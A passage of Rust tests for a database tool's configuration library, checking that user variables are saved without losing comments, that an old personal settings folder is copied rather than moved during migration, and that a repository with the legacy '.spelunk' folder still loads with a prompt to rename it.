        other => panic!("{:?}", other.map(|_| ())),
    }
    spelaion_config::set_user_vars(
        &fx.user(),
        &BTreeMap::from([("ssh_user".to_string(), "ana.ops".to_string())]),
    )
    .unwrap();
    resolve().unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let resolved = Resolver::new(&config, &trust, &backend)
        .resolve(&ws("orders"))
        .unwrap();
    assert_eq!(resolved.params.user, "ana");
    assert_eq!(resolved.tunnel.unwrap().hops[0].user, "ana.ops");

    // The file keeps its comments and other values.
    let content = std::fs::read_to_string(&user_toml).unwrap();
    assert!(content.starts_with("# My personal settings\n"), "{content}");
    assert!(content.contains("team = \"dba\" # kept"), "{content}");
    assert!(content.contains("db_user = \"ana\""), "{content}");

    // Bad names and empty values are refused; a new user directory gets a new file.
    for (name, value) in [("db user", "x"), ("x}", "y"), ("ok", "  ")] {
        assert!(
            spelaion_config::set_user_vars(
                &fx.user(),
                &BTreeMap::from([(name.to_string(), value.to_string())])
            )
            .is_err(),
            "{name:?} = {value:?}"
        );
    }
    let fresh = fx.base.join("fresh-user");
    spelaion_config::set_user_vars(
        &fresh,
        &BTreeMap::from([("db_user".to_string(), "luis".to_string())]),
    )
    .unwrap();
    let config = load(None, &fresh);
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.user.vars["db_user"], "luis");
}

#[test]
fn the_old_personal_folder_is_copied_never_moved() {
    let fx = Fixture::new("migrate-user");
    let old = fx.base.join("spelunkdb");
    let new = fx.base.join("spelaion");
    fx.write(
        "spelunkdb/user.toml",
        "schema_version = 1\n\n[vars]\ndb_user = \"ana\"\n",
    );
    fx.write(
        "spelunkdb/connections/local.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\n",
    );
    fx.write("spelunkdb/state.db", "history");
    fx.write("spelunkdb/state.db-wal", "wal");
    fx.write("spelunkdb/trusted-workspaces.toml", "version = 2\n");

    assert!(spelaion_config::migrate_user_dir(&old, &new).unwrap());
    // Everything is there, the local database under db/.
    let config = load(None, &new);
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.user.vars["db_user"], "ana");
    assert_eq!(config.connections.len(), 1);
    assert_eq!(
        std::fs::read_to_string(spelaion_config::state_db(&new)).unwrap(),
        "history"
    );
    assert!(new.join("db/state.db-wal").is_file());
    assert!(!new.join("state.db").exists());
    assert!(new.join("trusted-workspaces.toml").is_file());
    assert!(!new.with_extension("migrating").exists());
    // The old folder is untouched, as a backup.
    assert!(old.join("state.db").is_file() && old.join("user.toml").is_file());

    // Once the new folder exists, nothing is copied again.
    fx.write(
        "spelunkdb/user.toml",
        "schema_version = 1\n\n[vars]\ndb_user = \"changed\"\n",
    );
    assert!(!spelaion_config::migrate_user_dir(&old, &new).unwrap());
    assert_eq!(load(None, &new).user.vars["db_user"], "ana");
    // Without an old folder there is nothing to do.
    assert!(
        !spelaion_config::migrate_user_dir(&fx.base.join("none"), &fx.base.join("other")).unwrap()
    );
}

#[test]
fn a_repository_with_the_old_folder_name_still_loads_and_says_to_rename_it() {
    let fx = Fixture::new("legacy-workspace");
    let repo = fx.base.join("legacy");
    std::fs::create_dir_all(repo.join(".spelunk/connections")).unwrap();
    std::fs::write(
        repo.join(".spelunk/connections/orders.toml"),
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\n",
    )
    .unwrap();
    std::fs::create_dir_all(repo.join("src")).unwrap();

    assert_eq!(
        spelaion_config::find_workspace(&repo.join("src")).as_deref(),
        Some(repo.as_path())
    );
    assert_eq!(spelaion_config::workspace_dir(&repo), repo.join(".spelunk"));
    let config = load(Some(&repo), &fx.user());
    assert!(config.connection(&ws("orders")).is_some());
    let problems: Vec<String> = config.problems.iter().map(|p| p.to_string()).collect();
    assert!(
        problems
            .iter()
            .any(|p| p.contains("git mv .spelunk .spelaion")),
        "{problems:?}"
    );
    // A new connection saved from the app goes into the folder that exists.
    let id = add_connection(
        &config,
        &ConnectionDraft {
            name: "New".into(),
            engine: Engine::Sqlite,
            database: "y.db".into(),
            password: PasswordChoice::None,
            ..postgres_draft()
        },
        None,
        &FakeBackend::default(),
    )
    .unwrap();
    assert!(
        repo.join(format!(".spelunk/connections/{}.toml", id.path))
            .is_file()
    );
    assert!(!repo.join(".spelaion").exists());

    // With both folders, the new one is used and the old one is pointed out.
    std::fs::create_dir_all(repo.join(".spelaion/connections")).unwrap();
    let config = load(Some(&repo), &fx.user());
    assert!(config.connection(&ws("orders")).is_none());
    assert!(
        config
            .problems
            .iter()
            .any(|p| p.to_string().contains("both .spelaion/ and .spelunk/"))
    );
}
